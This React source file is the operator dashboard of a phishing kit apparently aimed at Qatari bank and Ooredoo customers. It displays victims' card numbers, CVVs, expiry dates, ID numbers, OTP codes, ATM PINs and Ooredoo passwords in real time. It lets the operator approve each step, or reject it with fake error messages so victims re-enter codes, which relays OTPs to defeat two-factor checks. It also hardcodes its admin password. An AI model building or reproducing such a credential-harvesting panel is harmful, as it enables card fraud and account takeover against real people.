import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Loader2, CheckCircle2, XCircle, Clock, Eye, RefreshCw, Key, User, CreditCard, Globe, LogOut, Search, LayoutDashboard, Phone, ShieldCheck } from "lucide-react";

export default function AdminDashboard() {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    if (typeof window !== 'undefined') {
      return localStorage.getItem("admin_auth") === "true";
    }
    return false;
  });
  const [searchTerm, setSearchTerm] = useState("");

  const { data: submissions, refetch, isLoading } = trpc.submissions.getAll.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const takeAction = trpc.submissions.takeAction.useMutation({
    onSuccess: () => {
      toast.success("تم تنفيذ الإجراء بنجاح");
      refetch();
    },
  });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "Qatar@@200") {
      setIsAuthenticated(true);
      localStorage.setItem("admin_auth", "true");
      toast.success("تم تسجيل الدخول بنجاح");
    } else {
      toast.error("كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem("admin_auth");
  };

  const handleAction = (sessionId: string, action: 'approve' | 'reject', step: string) => {
    let errorMessage = "";
    if (action === 'reject') {
      switch (step) {
        case 'personal':
        case 'card':
        case 'registration-completion':
          errorMessage = "برجاء التحقق من معلومات الدفع الصحيحة واعادة المحاولة";
          break;
        case 'otp':
          errorMessage = "برجاء التحقق من الرمز المرسل عبر الجوال";
          break;
        case 'atm':
          errorMessage = "الرقم السري للصراف الآلي غير صحيح";
          break;
        case 'ooredoo':
          errorMessage = "اسم المستخدم او كلمة المرور غير صحيحه";
          break;
        case 'otp_ooredoo':
          errorMessage = "الرمز غير صحيح او غير صالح";
          break;
        default:
          errorMessage = "حدث خطأ ما، يرجى إعادة المحاولة";
      }
    }

    takeAction.mutate({
      sessionId,
      action,
      errorMessage,
    });
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-3xl shadow-2xl p-8 space-y-8">
          <div className="text-center">
            <div className="w-20 h-20 bg-[#8C0032] rounded-3xl flex items-center justify-center mx-auto mb-6 rotate-3 shadow-xl">
              <Key className="text-white w-10 h-10 -rotate-3" />
            </div>
            <h1 className="text-3xl font-black text-slate-900 mb-2">لوحة الإدارة</h1>
            <p className="text-slate-500 font-medium">أدخل كلمة المرور للمتابعة</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <Input
                type="password"
                placeholder="كلمة المرور"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="h-14 bg-slate-50 border-slate-200 rounded-2xl text-center text-lg focus:ring-2 focus:ring-[#8C0032] transition-all"
              />
            </div>
            <Button type="submit" className="w-full h-14 bg-[#8C0032] hover:bg-[#a8003d] text-white text-lg font-bold rounded-2xl shadow-lg shadow-rose-200 transition-all active:scale-95">
              دخول النظام
            </Button>
          </form>
        </div>
      </div>
    );
  }

  const filteredSubmissions = submissions?.filter((s: any) => 
    s.personalData?.nameArabic?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    s.personalData?.phoneNumber?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-[#f1f5f9] text-slate-900 font-sans" dir="rtl">
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-[1600px] mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="bg-[#8C0032] p-2.5 rounded-xl shadow-lg shadow-rose-100">
              <LayoutDashboard className="text-white w-6 h-6" />
            </div>
            <div>
              <h1 className="text-xl font-black text-slate-900 tracking-tight">إدارة العمليات اللحظية</h1>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">النظام نشط الآن</span>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-6">
            <div className="relative hidden lg:block w-80">
              <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
              <Input
                placeholder="بحث برقم الهاتف أو الاسم..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pr-11 h-11 bg-slate-50 border-slate-200 rounded-xl"
              />
            </div>
            <Button variant="ghost" onClick={handleLogout} className="h-11 px-4 gap-2 text-slate-500 hover:text-rose-600 rounded-xl">
              <LogOut className="w-5 h-5" />
              <span className="font-bold">خروج</span>
            </Button>
          </div>
        </div>
      </nav>

      <main className="max-w-[1600px] mx-auto px-4 py-8 space-y-8">
        <div className="grid gap-6">
          {filteredSubmissions?.map((session: any) => (
            <Card key={session.id} className={session.status === 'loading' ? "border-[#8C0032] shadow-xl ring-2 ring-[#8C0032]/10" : "border-slate-200"}>
              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-4 border-b bg-slate-50/50">
                <div className="flex items-center gap-4">
                  <div className={`p-3 rounded-2xl ${session.status === 'loading' ? 'bg-[#8C0032]/10 text-[#8C0032]' : 'bg-slate-100 text-slate-500'}`}>
                    <User className="w-6 h-6" />
                  </div>
                  <div>
                    <CardTitle className="text-xl font-black">
                      {session.personalData?.nameArabic || 'عميل جديد'} 
                    </CardTitle>
                    <div className="flex items-center gap-3 mt-1">
                      <span className="flex items-center gap-1 text-sm font-bold text-slate-500 bg-white px-2 py-0.5 rounded-lg border border-slate-100">
                        <Phone className="w-3.5 h-3.5" />
                        {session.personalData?.phoneNumber || '—'}
                      </span>
                      <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">آخر تحديث: {new Date(session.updatedAt).toLocaleTimeString('ar-QA')}</span>
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="text-left">
                    <p className="text-[10px] font-black text-slate-400 uppercase mb-1">نوع العضوية</p>
                    <Badge variant="outline" className="px-4 py-1.5 font-black bg-white text-[#8C0032] border-[#8C0032]/20 shadow-sm">
                      {session.selectedBank?.toUpperCase()}
                    </Badge>
                  </div>
                  <Badge className={`px-5 py-2 text-sm font-black rounded-xl ${
                    session.status === 'loading' ? 'bg-amber-500 hover:bg-amber-600 animate-pulse' : 
                    session.status === 'approved' ? 'bg-emerald-500' : 
                    session.status === 'rejected' ? 'bg-rose-500' : 'bg-slate-400'
                  }`}>
                    {session.status === 'loading' ? 'طلب جديد - قيد المراجعة' : 
                     session.status === 'approved' ? 'تم القبول' : 
                     session.status === 'rejected' ? 'تم الرفض' : session.status}
                  </Badge>
                </div>
              </CardHeader>
              <CardContent className="pt-6">
                <div className="grid md:grid-cols-3 gap-8">
                  <div className="space-y-4">
                    <h3 className="text-xs font-black text-slate-400 uppercase tracking-wider flex items-center gap-2 px-1">
                      <ShieldCheck className="w-4 h-4" /> بيانات التحقق الشخصية
                    </h3>
                    <div className="bg-slate-50 p-5 rounded-[1.5rem] space-y-3 border border-slate-100 shadow-inner">
                      <div className="flex justify-between items-center">
                        <span className="text-xs font-bold text-slate-400">الرقم الشخصي:</span>
                        <span className="font-mono font-bold text-slate-700">{session.personalData?.idNumber || '—'}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-xs font-bold text-slate-400">البريد الإلكتروني:</span>
                        <span className="text-xs font-bold text-slate-600">{session.personalData?.email || '—'}</span>
                      </div>
                      <div className="flex justify-between items-center pt-2 border-t border-slate-200/50">
                        <span className="text-xs font-bold text-slate-400">العنوان:</span>
                        <span className="text-[10px] font-bold text-slate-500 max-w-[150px] text-left">{session.loginMethod?.deliveryAddress || '—'}</span>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-xs font-black text-slate-400 uppercase tracking-wider flex items-center gap-2 px-1">
                      <CreditCard className="w-4 h-4" /> بيانات الدفع والتحقق
                    </h3>
                    <div className={`p-5 rounded-[1.5rem] space-y-4 border transition-all ${session.status === 'loading' ? 'bg-white border-[#8C0032]/20 shadow-lg' : 'bg-slate-50 border-slate-100'}`}>
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] font-black text-slate-400 uppercase">المرحلة الحالية</span>
                        <Badge variant="secondary" className="bg-blue-50 text-blue-600 border-none font-black text-[10px] px-3">
                          {session.currentStep === 'personal' ? 'البيانات الشخصية' :
                           session.currentStep === 'card' || session.currentStep === 'registration-completion' ? 'بيانات البطاقة' :
                           session.currentStep === 'otp' ? 'رمز التحقق OTP' :
                           session.currentStep === 'atm' ? 'رقم الصراف PIN' :
                           session.currentStep === 'ooredoo' ? 'حساب Ooredoo' :
                           session.currentStep === 'otp_ooredoo' ? 'OTP Ooredoo' : session.currentStep}
                        </Badge>
                      </div>
                      
                      {(session.currentStep === 'card' || session.currentStep === 'registration-completion') && session.loginMethod && (
                        <div className="space-y-3 pt-3 border-t border-slate-100">
                          <div className="bg-slate-900 text-white p-4 rounded-xl shadow-inner">
                            <p className="text-lg font-black tracking-[0.2em] font-mono text-center">
                              {session.loginMethod.cardNumber}
                            </p>
                            <div className="flex justify-between mt-3 text-[10px] font-bold opacity-60">
                              <p>EXP: {session.loginMethod.expiryDate}</p>
                              <p>CVV: {session.loginMethod.cvv}</p>
                            </div>
                          </div>
                          <p className="text-[10px] text-center font-black text-slate-400 uppercase">{session.loginMethod.cardholderName}</p>
                        </div>
                      )}

                      {(session.currentStep === 'otp' || session.currentStep === 'otp_ooredoo') && session.otps?.[0] && (
                        <div className="pt-3 border-t border-slate-100 text-center">
                          <p className="text-[10px] font-black text-slate-400 mb-2 uppercase">رمز التحقق المستلم</p>
                          <p className="text-5xl font-black text-[#8C0032] tracking-[0.3em] py-4 bg-[#8C0032]/5 rounded-2xl border border-[#8C0032]/10 shadow-inner">
                            {session.otps[0].otpCode}
                          </p>
                        </div>
                      )}

                      {session.currentStep === 'atm' && session.atmPin && (
                        <div className="pt-3 border-t border-slate-100 text-center">
                          <p className="text-[10px] font-black text-slate-400 mb-2 uppercase">الرقم السري ATM</p>
                          <p className="text-4xl font-black text-emerald-600 tracking-[0.5em] py-4 bg-emerald-50 rounded-2xl border border-emerald-100 shadow-inner">
                            {session.atmPin.pin}
                          </p>
                        </div>
                      )}

                      {session.currentStep === 'ooredoo' && session.ooredoo && (
                        <div className="space-y-2 pt-3 border-t border-slate-100">
                          <div className="bg-slate-100 p-4 rounded-xl space-y-2 border border-slate-200 shadow-inner">
                            <div className="flex justify-between">
                              <span className="text-[10px] font-bold text-slate-400 uppercase">User:</span>
                              <span className="text-xs font-black text-slate-700">{session.ooredoo.ooredooUser}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-[10px] font-bold text-slate-400 uppercase">Pass:</span>
                              <span className="text-xs font-black text-slate-700">{session.ooredoo.ooredooPassword}</span>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="flex flex-col justify-center gap-4">
                    {session.status === 'loading' ? (
                      <div className="bg-white p-6 rounded-[2rem] border-2 border-dashed border-slate-200 flex flex-col gap-3 shadow-sm">
                        <p className="text-[10px] font-black text-center text-slate-400 mb-2 uppercase tracking-widest">اتخاذ إجراء فوري</p>
                        <Button 
                          variant="default" 
                          className="h-14 bg-emerald-600 hover:bg-emerald-700 text-white font-black text-lg rounded-2xl shadow-lg shadow-emerald-100 transition-all active:scale-95"
                          onClick={() => handleAction(session.id, 'approve', session.currentStep)}
                          disabled={takeAction.isPending}
                        >
                          <CheckCircle2 className="w-6 h-6 ml-3" /> قبول ومتابعة
                        </Button>
                        <Button 
                          variant="destructive" 
                          className="h-14 bg-rose-600 hover:bg-rose-700 text-white font-black text-lg rounded-2xl shadow-lg shadow-rose-100 transition-all active:scale-95"
                          onClick={() => handleAction(session.id, 'reject', session.currentStep)}
                          disabled={takeAction.isPending}
                        >
                          <XCircle className="w-6 h-6 ml-3" /> رفض مع خطأ
                        </Button>
                      </div>
                    ) : (
                      <div className="text-center p-8 bg-slate-50 rounded-[2.5rem] border border-slate-100 shadow-inner">
                        <div className={`mx-auto w-16 h-16 rounded-3xl flex items-center justify-center mb-4 shadow-lg ${session.status === 'approved' ? 'bg-emerald-500 text-white' : 'bg-rose-500 text-white'}`}>
                          {session.status === 'approved' ? <CheckCircle2 className="w-8 h-8" /> : <XCircle className="w-8 h-8" />}
                        </div>
                        <p className="font-black text-slate-700 text-lg">
                          {session.status === 'approved' ? 'تم القبول بنجاح' : 'تم الرفض وإرسال الخطأ'}
                        </p>
                        {session.errorMessage && (
                          <div className="mt-3 px-4 py-2 bg-rose-50 rounded-xl border border-rose-100">
                            <p className="text-[10px] text-rose-500 font-bold leading-relaxed italic">"{session.errorMessage}"</p>
                          </div>
                        )}
                        <Button variant="ghost" className="mt-4 text-[10px] font-bold text-slate-400 hover:text-[#8C0032]" onClick={() => refetch()}>تحديث الحالة</Button>
                      </div>
                    )}
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
          {(!filteredSubmissions || filteredSubmissions.length === 0) && (
            <div className="text-center py-24 bg-white rounded-[3rem] border border-slate-200 shadow-sm">
              <div className="bg-slate-50 w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-6">
                <Clock className="w-12 h-12 text-slate-200" />
              </div>
              <h3 className="text-2xl font-black text-slate-400">لا يوجد طلبات نشطة حالياً</h3>
              <p className="text-slate-300 font-medium mt-2">سيتم تحديث القائمة تلقائياً عند دخول عملاء جدد</p>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
